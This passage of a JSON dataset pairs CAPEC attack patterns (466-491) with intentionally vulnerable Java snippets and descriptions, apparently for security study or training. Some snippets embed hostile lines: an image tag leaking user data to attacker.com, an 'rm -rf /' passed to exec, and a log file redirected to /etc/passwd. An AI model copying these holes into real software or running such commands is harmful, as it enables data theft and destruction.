        "code_snippet": "public class TransparentProxy {\n    private static final String DEFAULT_TARGET = \"http://default-server.com\";\n    \n    public void forwardRequest(HttpServletRequest request, HttpServletResponse response) {\n        try {\n            String targetUrl = request.getParameter(\"url\");\n            if (targetUrl == null) targetUrl = DEFAULT_TARGET;\n            \n            URL url = new URL(targetUrl);\n            HttpURLConnection conn = (HttpURLConnection) url.openConnection();\n            \n            // Forward all headers without validation\n            Enumeration<String> headerNames = request.getHeaderNames();\n            while (headerNames.hasMoreElements()) {\n                String headerName = headerNames.nextElement();\n                conn.setRequestProperty(headerName, request.getHeader(headerName));\n            }\n            \n            // Forward request without checking content or authorization\n            InputStream requestBody = request.getInputStream();\n            OutputStream connOutputStream = conn.getOutputStream();\n            IOUtils.copy(requestBody, connOutputStream);\n            \n            // Forward response without sanitization\n            InputStream responseStream = conn.getInputStream();\n            OutputStream clientOutput = response.getOutputStream();\n            IOUtils.copy(responseStream, clientOutput);\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This vulnerable transparent proxy implementation forwards HTTP requests without proper validation, security checks, or sanitization. It demonstrates multiple vulnerabilities including confused deputy (CWE-441) by not preserving the original request source, HTTP request smuggling (CWE-444) by not properly validating malformed requests, client-side security enforcement (CWE-602) by lacking server-side validation, improper information removal (CWE-212) by forwarding sensitive headers, and incorrect destination specification (CWE-941) by accepting unchecked target URLs."
    },
    {
        "capec_id": "466",
        "capec_name": "Leveraging Active Adversary in the Middle Attacks to Bypass Same Origin Policy",
        "code_snippet": "public class WebSocket {\n    private String origin;\n    private Socket socket;\n\n    public WebSocket(String host, int port) {\n        try {\n            socket = new Socket(host, port);\n            // No TLS/SSL configuration\n            // No origin validation\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public void connect(String targetOrigin) {\n        this.origin = targetOrigin;\n        // Sending handshake without verifying server certificate\n        String handshake = \"GET / HTTP/1.1\\r\\n\" +\n                          \"Host: \" + targetOrigin + \"\\r\\n\" +\n                          \"Origin: \" + origin + \"\\r\\n\" +\n                          \"Upgrade: websocket\\r\\n\" +\n                          \"Connection: Upgrade\\r\\n\\r\\n\";\n        try {\n            socket.getOutputStream().write(handshake.getBytes());\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public void sendMessage(String message) {\n        try {\n            // No message encryption\n            // No endpoint verification\n            socket.getOutputStream().write(message.getBytes());\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This code demonstrates a vulnerable WebSocket implementation that fails to properly secure communication channels. It lacks TLS/SSL encryption, proper endpoint verification, and origin validation. The code relies on client-side security controls and doesn't implement proper channel security, making it susceptible to man-in-the-middle attacks. The absence of proper authentication and encryption allows an attacker to intercept and manipulate the communication between the client and server."
    },
    {
        "capec_id": "467",
        "capec_name": "Cross Site Identification",
        "code_snippet": "public class SocialNetworkServlet extends HttpServlet {\n    @Override\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        String sessionId = request.getParameter(\"sessionId\");\n        String profileId = request.getParameter(\"profileId\");\n        \n        // No CSRF token validation\n        // No session validation\n        String userInfo = getUserInfo(sessionId, profileId);\n        \n        response.setContentType(\"text/html\");\n        PrintWriter out = response.getWriter();\n        // Direct reflection of user input without sanitization\n        out.println(\"<html><body>User Info: \" + userInfo + \n            \"<img src='http://attacker.com/steal?data=\" + userInfo + \"'></body></html>\");\n    }\n    \n    private String getUserInfo(String sessionId, String profileId) {\n        // Directly use session without validation\n        Session userSession = sessionManager.getSession(sessionId);\n        // No access control check\n        return socialNetworkAPI.fetchUserDetails(profileId);\n    }\n}",
        "description": "This vulnerable code demonstrates a social network information harvesting scenario. It contains multiple vulnerabilities including CSRF (no tokens), XSS (unsanitized output), sensitive information exposure via GET parameters, and session validation issues. The code allows unauthorized access to user profile information through session hijacking and includes a hidden image that leaks the harvested data to an attacker's server."
    },
    {
        "capec_id": "468",
        "capec_name": "Generic Cross-Browser Cross-Domain Theft",
        "code_snippet": "public class StylesheetController {\n    @RequestMapping(\"/style\")\n    public void serveStylesheet(HttpServletResponse response, @RequestParam String theme) {\n        response.setContentType(\"text/css\");\n        String cssContent = \"body { background: \" + theme + \"; }\";\n        PrintWriter writer = response.getWriter();\n        writer.write(cssContent);\n        writer.flush();\n    }\n\n    @RequestMapping(\"/load-external-css\")\n    public void loadExternalCSS(HttpServletResponse response, @RequestParam String cssUrl) {\n        URL url = new URL(cssUrl);\n        URLConnection conn = url.openConnection();\n        conn.setRequestProperty(\"Cookie\", request.getHeader(\"Cookie\"));\n        InputStream is = conn.getInputStream();\n        IOUtils.copy(is, response.getOutputStream());\n    }\n}",
        "description": "This vulnerable code demonstrates CSS injection issues by directly incorporating user input into CSS content and allowing cross-domain CSS loading without proper sanitization. The code forwards cookies automatically and doesn't validate CSS content structure, allowing potential data theft through malformed CSS. It fails to properly encode output and handle URL encoding, making it susceptible to CSS-based attacks."
    },
    {
        "capec_id": "469",
        "capec_name": "HTTP DoS",
        "code_snippet": "public class VulnerableWebServer {\n    private static final Map<String, HttpSession> sessions = new HashMap<>();\n    \n    public void handleRequest(HttpServletRequest request) {\n        String sessionId = request.getParameter(\"sessionId\");\n        HttpSession session;\n        \n        if (sessionId != null) {\n            session = sessions.get(sessionId);\n            if (session == null) {\n                session = new HttpSession();\n                sessions.put(sessionId, session);\n            }\n        } else {\n            session = new HttpSession();\n            sessions.put(String.valueOf(sessions.size()), session);\n        }\n        \n        // Keep connection open indefinitely\n        while(true) {\n            try {\n                Thread.sleep(10000);\n                session.keepAlive();\n            } catch(InterruptedException e) {\n                // Do nothing, continue keeping session alive\n            }\n        }\n    }\n    \n    private class HttpSession {\n        private byte[] sessionData = new byte[1024 * 1024]; // 1MB per session\n        \n        public void keepAlive() {\n            // Keep session active without timeout\n        }\n    }\n}",
        "description": "This code demonstrates a vulnerable web server implementation that allows unlimited session creation without proper resource management. It lacks session timeout mechanisms, doesn't limit concurrent connections, and keeps sessions alive indefinitely. Each session allocates 1MB of memory without bounds, making it susceptible to memory exhaustion through multiple concurrent requests."
    },
    {
        "capec_id": "470",
        "capec_name": "Expanding Control over the Operating System from the Database",
        "code_snippet": "public class DatabaseManager {\n    private Connection conn;\n    private Statement stmt;\n\n    public void executeQuery(String userInput) {\n        try {\n            // Run as system admin for all operations\n            conn = DriverManager.getConnection(\"jdbc:mysql://localhost/db\", \"root\", \"password\");\n            stmt = conn.createStatement();\n\n            // Dangerous: allows execution of any SQL command including system commands\n            String query = \"SELECT * FROM users WHERE id = '\" + userInput + \"'\";\n            \n            // Enable extended commands including file system access\n            stmt.execute(\"SET GLOBAL general_log = 'ON';\");\n            stmt.execute(\"SET GLOBAL general_log_file = '/etc/passwd';\");\n            \n            ResultSet rs = stmt.executeQuery(query);\n            \n            // Cursor left open, potentially allowing other users to access it\n            // stmt.close();\n            // conn.close();\n            \n        } catch (SQLException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public void createCustomFunction(String functionBody) {\n        try {\n            // Dangerous: allows creation of custom functions with system access\n            String createFunc = \"CREATE FUNCTION customFunc() RETURNS INT SONAME '\" + functionBody + \"';\";\n            stmt.execute(createFunc);\n        } catch (SQLException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This vulnerable code demonstrates multiple database security issues including SQL injection, excessive privileges, dangling cursors, and the ability to create custom functions that can access system resources. The code runs with root privileges, doesn't sanitize user input, leaves database cursors open, and allows arbitrary function creation that could be used to compromise the system."
    },
    {
        "capec_id": "471",
        "capec_name": "Search Order Hijacking",
        "code_snippet": "public class LibraryLoader {\n    static {\n        String libraryPath = System.getProperty(\"user.dir\") + \"/libs\";\n        System.setProperty(\"java.library.path\", libraryPath);\n        try {\n            System.loadLibrary(\"nativelib\");\n        } catch (UnsatisfiedLinkError e) {\n            // Fallback to loading from current directory\n            String currentDir = System.getProperty(\"user.dir\");\n            System.load(currentDir + \"/nativelib.dll\");\n        }\n    }\n    \n    public native void performSecureOperation();\n    \n    public static void main(String[] args) {\n        LibraryLoader loader = new LibraryLoader();\n        loader.performSecureOperation();\n    }\n}",
        "description": "This code demonstrates vulnerable library loading by first attempting to load from a specified directory and then falling back to the current directory without proper validation. An attacker could place a malicious library named 'nativelib.dll' in the current directory, which would be loaded instead of the legitimate library due to the search path prioritization."
    },
    {
        "capec_id": "472",
        "capec_name": "Browser Fingerprinting",
        "code_snippet": "public class BrowserFingerprinting {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) {\n        String userAgent = request.getHeader(\"User-Agent\");\n        String fingerprint = \"<script>\\n\" +\n            \"var browserInfo = {\\n\" +\n            \"  userAgent: navigator.userAgent,\\n\" +\n            \"  platform: navigator.platform,\\n\" +\n            \"  plugins: navigator.plugins.length,\\n\" +\n            \"  cookieEnabled: navigator.cookieEnabled\\n\" +\n            \"};\\n\" +\n            \"fetch('/collect-fingerprint', {\\n\" +\n            \"  method: 'GET',\\n\" +\n            \"  headers: { 'Content-Type': 'application/json' },\\n\" +\n            \"  credentials: 'include',\\n\" +\n            \"  query: '?data=' + encodeURIComponent(JSON.stringify(browserInfo))\\n\" +\n            \"});\\n\" +\n            \"</script>\";\n        response.setContentType(\"text/html\");\n        response.getWriter().write(fingerprint);\n    }\n}",
        "description": "This vulnerable code injects JavaScript that collects browser fingerprinting information and sends it via an unprotected GET request. It's vulnerable to XSS as it doesn't sanitize output, exposes sensitive information through GET parameters, and doesn't implement proper content security policies. The code directly embeds JavaScript into the response without proper encoding or validation."
    },
    {
        "capec_id": "473",
        "capec_name": "Signature Spoof",
        "code_snippet": "public class MessageProcessor {\n    public boolean processSignedMessage(String message, String signature) {\n        // Weak cryptographic validation using simple string comparison\n        String hardcodedSignature = \"fixed_signature_123\";\n        \n        if(signature.equals(hardcodedSignature)) {\n            // Blindly trust message without proper validation\n            executeCommand(message);\n            return true;\n        }\n        return false;\n    }\n    \n    private void executeCommand(String message) {\n        try {\n            // Directly execute commands from message without validation\n            Runtime.getRuntime().exec(message);\n        } catch(Exception e) {\n            e.printStackTrace();\n        }\n    }\n    \n    public static void main(String[] args) {\n        MessageProcessor processor = new MessageProcessor();\n        String maliciousMessage = \"rm -rf /\";\n        processor.processSignedMessage(maliciousMessage, \"fixed_signature_123\");\n    }\n}",
        "description": "This code demonstrates vulnerable message processing that accepts signed messages without proper cryptographic validation. It uses a hardcoded signature for comparison, lacks input validation, and executes commands from the message content directly. The code is susceptible to signature spoofing and malicious command injection."
    },
    {
        "capec_id": "474",
        "capec_name": "Signature Spoofing by Key Theft",
        "code_snippet": "public class SignatureVerification {\n    private static final String PRIVATE_KEY_FILE = \"c:/keys/private.key\";\n    private static final String PUBLIC_KEY_FILE = \"c:/keys/public.key\";\n    \n    public boolean verifySignature(byte[] data, byte[] signature) {\n        try {\n            // Load private key from unprotected file system\n            File keyFile = new File(PRIVATE_KEY_FILE);\n            FileInputStream fis = new FileInputStream(keyFile);\n            byte[] keyBytes = new byte[(int) keyFile.length()];\n            fis.read(keyBytes);\n            fis.close();\n            \n            // Store key in plaintext in memory\n            PrivateKey privateKey = getPrivateKey(keyBytes);\n            \n            // No verification of key origin or ownership\n            Signature sig = Signature.getInstance(\"SHA256withRSA\");\n            sig.initSign(privateKey);\n            sig.update(data);\n            \n            // Automatically trust any signature that matches\n            return Arrays.equals(signature, sig.sign());\n        } catch (Exception e) {\n            return false;\n        }\n    }\n}",
        "description": "This code demonstrates vulnerable signature verification by storing private keys in an unprotected location, failing to verify key ownership, and implementing weak signature validation. It stores credentials insecurely (CWE-522), lacks proper authentication (CWE-290), assumes key immutability (CWE-302), and performs key operations without entity verification (CWE-322)."
    },
    {
        "capec_id": "475",
        "capec_name": "Signature Spoofing by Improper Validation",
        "code_snippet": "public class SignatureVerifier {\n    public static boolean verifySignature(byte[] data, byte[] signature) {\n        try {\n            Signature sig = Signature.getInstance(\"MD5withRSA\");\n            // Missing proper key initialization\n            // Using static/hardcoded public key\n            byte[] hardcodedKey = \"defaultKey123\".getBytes();\n            X509EncodedKeySpec keySpec = new X509EncodedKeySpec(hardcodedKey);\n            KeyFactory kf = KeyFactory.getInstance(\"RSA\");\n            PublicKey publicKey = kf.generatePublic(keySpec);\n            \n            sig.initVerify(publicKey);\n            sig.update(data);\n            \n            // Vulnerable: No proper signature length validation\n            if(signature.length > 0) {\n                return sig.verify(signature);\n            }\n            return true; // Bypass if signature is empty\n        } catch(Exception e) {\n            // Vulnerable: Silently catch all exceptions and return true\n            return true;\n        }\n    }\n}",
        "description": "This vulnerable code demonstrates weak signature verification by using an insecure algorithm (MD5withRSA), hardcoded keys, improper signature validation, and authentication bypass through exception handling. It allows signature verification to succeed even with invalid or empty signatures."
    },
    {
        "capec_id": "476",
        "capec_name": "Signature Spoofing by Misrepresentation",
        "code_snippet": "public class SignatureVerifier {\n    public boolean verifyMessage(String message, String signature) {\n        // Weak signature verification that's vulnerable to spoofing\n        byte[] signatureBytes = Base64.getDecoder().decode(signature);\n        String claimedIdentity = extractIdentity(signatureBytes);\n        \n        // No proper cryptographic verification\n        if (signatureBytes.length > 0 && claimedIdentity != null) {\n            // Blindly trust the claimed identity without verification\n            return true;\n        }\n        return false;\n    }\n    \n    private String extractIdentity(byte[] signatureBytes) {\n        // Vulnerable parsing of signature data\n        String rawData = new String(signatureBytes);\n        if (rawData.contains(\"identity=\")) {\n            return rawData.split(\"identity=\")[1];\n        }\n        return null;\n    }\n    \n    public void processSignedMessage(String message, String signature) {\n        if (verifyMessage(message, signature)) {\n            // Perform sensitive operations based on unverified signature\n            executeCommand(message);\n        }\n    }\n    \n    private void executeCommand(String command) {\n        // Execute potentially dangerous command without proper validation\n        try {\n            Runtime.getRuntime().exec(command);\n        } catch (Exception e) {\n            // Silently ignore errors\n        }\n    }\n}",
        "description": "This code demonstrates vulnerable signature verification where an attacker can spoof identities and execute arbitrary commands. The code fails to properly verify cryptographic signatures, blindly trusts claimed identities, and executes commands based on unverified input. It includes weak parsing of signature data, improper authentication checks, and unsafe command execution, making it susceptible to signature spoofing attacks."
    },
    {
        "capec_id": "477",
        "capec_name": "Signature Spoofing by Mixing Signed and Unsigned Content",
        "code_snippet": "public class SignedDataProcessor {\n    public void processData(byte[] data) {\n        // Transmit data without encryption\n        String url = \"http://example.com/api\";\n        HttpURLConnection conn = (HttpURLConnection) new URL(url).openConnection();\n        conn.setDoOutput(true);\n        \n        // Unsafe conversion from unsigned to signed\n        int unsignedValue = data[0] & 0xFF;\n        byte signedValue = (byte) unsignedValue;\n        \n        // Process data without signature verification\n        if(signedValue > 0) {\n            // Store sensitive data without encryption\n            FileOutputStream fos = new FileOutputStream(\"data.bin\");\n            fos.write(data);\n            fos.close();\n        }\n    }\n}",
        "description": "This code demonstrates multiple vulnerabilities including unsigned-to-signed conversion issues, lack of encryption for sensitive data transmission and storage, and missing cryptographic signature verification. The code processes byte data with unsafe type conversion, transmits it over cleartext HTTP, and stores it without encryption, making it susceptible to data manipulation and information disclosure attacks."
    },
    {
        "capec_id": "478",
        "capec_name": "Modification of Windows Service Configuration",
        "code_snippet": "import java.io.*;\nimport java.nio.file.*;\n\npublic class ServiceModifier {\n    private static final String SERVICE_PATH = \"C:\\\\Windows\\\\System32\\\\services\";\n    \n    public static void modifyServiceBinary(String serviceName, String newBinaryPath) {\n        try {\n            String command = \"sc config \" + serviceName + \" binPath= \\\"\" + newBinaryPath + \"\\\"\";\n            Process process = Runtime.getRuntime().exec(command);\n            \n            // No permission checks or validation\n            Files.copy(Paths.get(newBinaryPath), \n                       Paths.get(SERVICE_PATH, serviceName + \".exe\"), \n                       StandardCopyOption.REPLACE_EXISTING);\n            \n            // Store sensitive data in alternate data stream\n            String adsCommand = \"echo Modified > \" + SERVICE_PATH + \"\\\\\" + serviceName + \".exe:modified.txt\";\n            Runtime.getRuntime().exec(adsCommand);\n            \n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This vulnerable code allows modification of Windows service binaries without proper access control checks. It uses unvalidated system commands, doesn't verify user permissions, writes to sensitive system directories, and uses alternate data streams. The code can be exploited to replace legitimate service executables with malicious ones."
    },
    {
        "capec_id": "479",
        "capec_name": "Malicious Root Certificate",
        "code_snippet": "public class VulnerableCertificateManager {\n    public void installCustomCertificate(String certPath) {\n        try {\n            KeyStore keyStore = KeyStore.getInstance(KeyStore.getDefaultType());\n            FileInputStream fis = new FileInputStream(certPath);\n            keyStore.load(fis, null);\n            \n            TrustManagerFactory tmf = TrustManagerFactory.getInstance(TrustManagerFactory.getDefaultAlgorithm());\n            tmf.init(keyStore);\n            \n            SSLContext sslContext = SSLContext.getInstance(\"TLS\");\n            sslContext.init(null, tmf.getTrustManagers(), null);\n            \n            // Vulnerable: Blindly accepting and installing any certificate\n            HttpsURLConnection.setDefaultSSLSocketFactory(sslContext.getSocketFactory());\n            \n            // Disable hostname verification\n            HttpsURLConnection.setDefaultHostnameVerifier((hostname, session) -> true);\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n    \n    public String makeSecureRequest(String url) {\n        try {\n            URL requestUrl = new URL(url);\n            HttpsURLConnection conn = (HttpsURLConnection) requestUrl.openConnection();\n            \n            // Vulnerable: No certificate validation\n            conn.setHostnameVerifier((hostname, session) -> true);\n            \n            BufferedReader br = new BufferedReader(new InputStreamReader(conn.getInputStream()));\n            return br.readLine();\n        } catch (Exception e) {\n            return null;\n        }\n    }\n}",
        "description": "This vulnerable code demonstrates improper certificate validation and installation. It allows installation of untrusted root certificates without proper verification, disables hostname verification, and skips proper certificate chain validation. The code blindly trusts any SSL certificate and allows connections to potentially malicious hosts by bypassing certificate validation checks."
    },
    {
        "capec_id": "480",
        "capec_name": "Escaping Virtualization",
        "code_snippet": "public class VirtualizationEscape {\n    static {\n        try {\n            System.loadLibrary(\"untrusted_lib\");\n        } catch (UnsatisfiedLinkError e) {\n            System.err.println(\"Failed to load library\");\n        }\n    }\n\n    public native void executeNativeCode();\n\n    public void runVirtualizedProcess() {\n        // Vulnerable: No isolation checks or containment\n        Runtime runtime = Runtime.getRuntime();\n        try {\n            String[] unsafeCommands = {\"bash\", \"-c\", System.getenv(\"VIRTUAL_CMD\")};\n            Process process = runtime.exec(unsafeCommands);\n            \n            // Attempt to access host system resources\n            File hostFile = new File(\"/host/sensitive_data\");\n            FileInputStream fis = new FileInputStream(hostFile);\n            \n            // Execute potentially privileged native code\n            executeNativeCode();\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This code demonstrates a vulnerable virtualization implementation that fails to properly isolate or compartmentalize processes. It loads an untrusted native library, executes system commands from environment variables without validation, and attempts to access host system resources from within a virtualized environment. The code lacks proper boundary checks and protection mechanisms, making it susceptible to virtualization escape attacks and privilege escalation."
    },
    {
        "capec_id": "481",
        "capec_name": "Contradictory Destinations in Traffic Routing Schemes",
        "code_snippet": "public class VulnerableCDNRouter {\n    public String routeRequest(String sniDomain, String httpHostDomain, String requestPath) {\n        // Vulnerable: No validation of domain consistency\n        TLSConnection tlsConn = new TLSConnection(sniDomain);\n        \n        // HTTP request setup without checking domain match\n        HttpRequest request = new HttpRequest();\n        request.setHost(httpHostDomain);\n        request.setPath(requestPath);\n        \n        // No verification if SNI and HTTP Host header match\n        if (tlsConn.isEstablished()) {\n            // Blindly forwards the request based on HTTP Host header\n            // allowing domain fronting\n            return proxyRequest(request);\n        }\n        \n        return \"Connection failed\";\n    }\n    \n    private String proxyRequest(HttpRequest request) {\n        // Vulnerable: No canonical URL validation\n        // No cross-domain policy checks\n        String destination = request.getHost() + request.getPath();\n        return forwardToDestination(destination);\n    }\n}",
        "description": "This code demonstrates vulnerable CDN routing that allows domain fronting by not validating consistency between SNI and HTTP Host headers. It fails to implement proper domain validation, canonical URL checking, and cross-domain policy enforcement, making it susceptible to request smuggling and unauthorized endpoint communication."
    },
    {
        "capec_id": "482",
        "capec_name": "TCP Flood",
        "code_snippet": "public class VulnerableServer {\n    private ServerSocket serverSocket;\n    private List<Socket> connections = new ArrayList<>();\n\n    public void start(int port) {\n        try {\n            serverSocket = new ServerSocket(port);\n            while (true) {\n                Socket clientSocket = serverSocket.accept();\n                connections.add(clientSocket); // Unlimited connections stored\n                \n                // No connection timeout set\n                // No limit on connection queue\n                // No validation of SYN packets\n                // No rate limiting\n                \n                new Thread(() -> handleClient(clientSocket)).start();\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private void handleClient(Socket clientSocket) {\n        try {\n            DataInputStream in = new DataInputStream(clientSocket.getInputStream());\n            while (true) {\n                String message = in.readUTF(); // Reading cleartext data\n                // No message integrity check\n                // No rate limiting on messages\n                processMessage(message);\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private void processMessage(String message) {\n        // Process message without any validation or limits\n    }\n}",
        "description": "This code demonstrates a vulnerable TCP server implementation that is susceptible to SYN flooding attacks. It lacks resource allocation limits, accepts cleartext transmissions, performs no message integrity checks, and has no protection against network amplification attacks. The server maintains an unbounded list of connections and creates a new thread for each connection without any limits, making it vulnerable to resource exhaustion."
    },
    {
        "capec_id": "484",
        "capec_name": "DEPRECATED: XML Client-Side Attack",
        "code_snippet": "public class XMLProcessor {\n    public Document processXMLFromClient(String xmlInput) {\n        try {\n            // Missing XML validation against schema\n            DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();\n            // Vulnerable: XML External Entity (XXE) enabled by default\n            DocumentBuilder builder = factory.newDocumentBuilder();\n            \n            // Direct processing of untrusted XML without sanitization\n            Document doc = builder.parse(new InputSource(new StringReader(xmlInput)));\n            \n            // Client-side security check that can be bypassed\n            if(xmlInput.contains(\"<script>\")) {\n                return null;\n            }\n            \n            // Process XML without proper entity restrictions\n            NodeList nodes = doc.getElementsByTagName(\"*\");\n            return doc;\n            \n        } catch(Exception e) {\n            return null;\n        }\n    }\n}",
        "description": "This code demonstrates multiple XML-related vulnerabilities including missing XML validation, improper XXE handling, client-side security enforcement, and lack of proper input sanitization. The code accepts untrusted XML input and processes it without proper security controls, making it vulnerable to XML injection, XXE attacks, and authentication bypass through XML manipulation."
    },
    {
        "capec_id": "485",
        "capec_name": "Signature Spoofing by Key Recreation",
        "code_snippet": "public class WeakSignatureGenerator {\n    private static int counter = 0;\n    private static final long SEED = 123456L;\n    \n    public static byte[] generatePrivateKey() {\n        Random random = new Random(SEED);\n        byte[] privateKey = new byte[32];\n        random.nextBytes(privateKey);\n        return privateKey;\n    }\n    \n    public static String signMessage(String message, byte[] privateKey) {\n        // Predictable nonce based on counter\n        String nonce = String.valueOf(counter++);\n        try {\n            Signature signature = Signature.getInstance(\"SHA256withRSA\");\n            KeyFactory kf = KeyFactory.getInstance(\"RSA\");\n            // Using predictable key generation\n            PrivateKey signingKey = kf.generatePrivate(new PKCS8EncodedKeySpec(privateKey));\n            signature.initSign(signingKey);\n            signature.update(message.getBytes());\n            return Base64.getEncoder().encodeToString(signature.sign());\n        } catch (Exception e) {\n            return null;\n        }\n    }\n}",
        "description": "This code demonstrates vulnerable cryptographic signature generation using predictable random number generation (CWE-330, CWE-1241) and weak key generation. It uses a fixed seed for random number generation and a simple counter for nonce creation, making it susceptible to signature forgery attacks. The private key generation is deterministic and can be predicted, allowing attackers to potentially recreate the same keys and forge signatures."
    },
    {
        "capec_id": "486",
        "capec_name": "UDP Flood",
        "code_snippet": "public class UnsafeUDPServer {\n    private DatagramSocket socket;\n    private boolean running;\n\n    public void start(int port) throws IOException {\n        socket = new DatagramSocket(port);\n        running = true;\n        byte[] buffer = new byte[65507]; // Max UDP packet size\n\n        while (running) {\n            DatagramPacket packet = new DatagramPacket(buffer, buffer.length);\n            socket.receive(packet);\n            \n            // Process each incoming packet in a new thread without limits\n            new Thread(() -> {\n                String message = new String(packet.getData());\n                // No message validation or rate limiting\n                // Immediately send response without verification\n                try {\n                    byte[] response = message.toUpperCase().getBytes();\n                    DatagramPacket responsePacket = new DatagramPacket(\n                        response,\n                        response.length,\n                        packet.getAddress(),\n                        packet.getPort()\n                    );\n                    socket.send(responsePacket);\n                } catch (IOException e) {\n                    e.printStackTrace();\n                }\n            }).start();\n        }\n    }\n}",
        "description": "This vulnerable UDP server code demonstrates multiple security issues: it creates unlimited threads for each incoming packet (CWE-770), doesn't validate source addresses (CWE-941), transmits data in cleartext (CWE-319), lacks traffic volume control (CWE-406), and performs no message integrity checks (CWE-924). The server is susceptible to UDP flooding attacks due to unbounded resource allocation and lack of rate limiting."
    },
    {
        "capec_id": "487",
        "capec_name": "ICMP Flood",
        "code_snippet": "public class ICMPFloodServer {\n    public void handleICMPRequests() {\n        DatagramSocket socket = null;\n        try {\n            socket = new DatagramSocket(8888);\n            byte[] buffer = new byte[65507];\n            \n            while (true) {\n                DatagramPacket packet = new DatagramPacket(buffer, buffer.length);\n                socket.receive(packet);\n                \n                // No rate limiting or validation of source\n                new Thread(() -> {\n                    try {\n                        // Process each ICMP packet in a new thread without limits\n                        String data = new String(packet.getData());\n                        assert(data.length() > 0);\n                        \n                        // Echo back to source (potentially spoofed address)\n                        DatagramPacket response = new DatagramPacket(\n                            packet.getData(),\n                            packet.getLength(),\n                            packet.getAddress(),\n                            packet.getPort()\n                        );\n                        socket.send(response);\n                    } catch (Exception e) {\n                        e.printStackTrace();\n                    }\n                }).start();\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This code demonstrates a vulnerable ICMP server implementation that is susceptible to flooding attacks. It creates an unrestricted number of threads for each incoming packet, lacks source validation, implements no rate limiting, uses assertions that can be triggered, and responds to potentially spoofed addresses. The server blindly trusts incoming packets and processes them without any resource constraints or proper endpoint verification."
    },
    {
        "capec_id": "488",
        "capec_name": "HTTP Flood",
        "code_snippet": "public class VulnerableWebServer {\n    private static final int MAX_CONNECTIONS = Integer.MAX_VALUE;\n    private List<Session> activeSessions = new ArrayList<>();\n\n    @RequestMapping(value = \"/api/data\", method = RequestMethod.GET)\n    public ResponseEntity<?> processRequest(\n            @RequestParam String query,\n            @RequestParam String sensitiveData,\n            @RequestParam String url) {\n        \n        Session session = new Session();\n        activeSessions.add(session);\n\n        // No limit on concurrent connections or resource allocation\n        for(int i = 0; i < query.length(); i++) {\n            byte[] memory = new byte[1024 * 1024]; // Allocate 1MB per character\n        }\n\n        // Sensitive data exposed in GET request\n        String response = \"Processing query: \" + query + \n                         \" with sensitive data: \" + sensitiveData;\n\n        // SSRF vulnerability\n        URL targetUrl = new URL(url);\n        return ResponseEntity.ok(new Scanner(targetUrl.openStream()).useDelimiter(\"\\\\A\").next());\n    }\n}",
        "description": "This code demonstrates multiple vulnerabilities including unbounded resource allocation (CWE-770), sensitive data exposure in GET requests (CWE-598), SSRF (CWE-918), and insufficient resource pooling (CWE-410). The server accepts unlimited concurrent connections, processes sensitive data through GET parameters, and makes unrestricted URL requests without validation, making it susceptible to HTTP flooding attacks."
    },
    {
        "capec_id": "489",
        "capec_name": "SSL Flood",
        "code_snippet": "public class SSLServer {\n    private static final int MAX_CONNECTIONS = Integer.MAX_VALUE;\n    private ExecutorService threadPool;\n    \n    public SSLServer() {\n        threadPool = Executors.newCachedThreadPool();\n    }\n    \n    public void startServer() {\n        try {\n            SSLServerSocket serverSocket = (SSLServerSocket) SSLServerSocketFactory\n                .getDefault().createServerSocket(443);\n            \n            while(true) {\n                SSLSocket clientSocket = (SSLSocket) serverSocket.accept();\n                threadPool.execute(() -> handleConnection(clientSocket));\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n    \n    private void handleConnection(SSLSocket socket) {\n        try {\n            // No limit on renegotiations\n            socket.setEnableSessionCreation(true);\n            socket.setWantClientAuth(true);\n            \n            // Process SSL handshake without any rate limiting\n            socket.startHandshake();\n            \n            // Keep connection open indefinitely\n            while(socket.isConnected()) {\n                Thread.sleep(1000);\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This vulnerable code implements an SSL server that fails to implement resource constraints and allows unlimited SSL renegotiations. It uses an unbounded thread pool, doesn't limit concurrent connections, and lacks any form of rate limiting for SSL handshakes. Each connection is kept alive indefinitely, making it susceptible to SSL renegotiation flooding attacks that can exhaust server resources."
    },
    {
        "capec_id": "490",
        "capec_name": "Amplification",
        "code_snippet": "public class UDPAmplificationServer {\n    private DatagramSocket socket;\n    \n    public void startServer() throws Exception {\n        socket = new DatagramSocket(53);\n        byte[] receiveData = new byte[1024];\n        \n        while (true) {\n            DatagramPacket receivePacket = new DatagramPacket(receiveData, receiveData.length);\n            socket.receive(receivePacket);\n            \n            // No validation of source IP or request limits\n            String request = new String(receivePacket.getData());\n            \n            // Generate large response (amplification)\n            byte[] response = new byte[65507]; // Max UDP packet size\n            Arrays.fill(response, (byte) 'A');\n            \n            // Send large response to source address without verification\n            DatagramPacket responsePacket = new DatagramPacket(\n                response,\n                response.length,\n                receivePacket.getAddress(),\n                receivePacket.getPort()\n            );\n            \n            // No rate limiting or resource checks\n            socket.send(responsePacket);\n        }\n    }\n}",
        "description": "This vulnerable code implements a UDP server that demonstrates an amplification attack vulnerability. It accepts small requests but generates and sends back significantly larger responses without any validation, rate limiting, or resource controls. The server blindly trusts the source IP address, making it suitable for IP spoofing attacks. Each small request triggers a maximum-sized UDP response (65507 bytes), creating a massive amplification ratio that could be used in DDoS attacks."
    },
    {
        "capec_id": "491",
        "capec_name": "Quadratic Data Expansion",
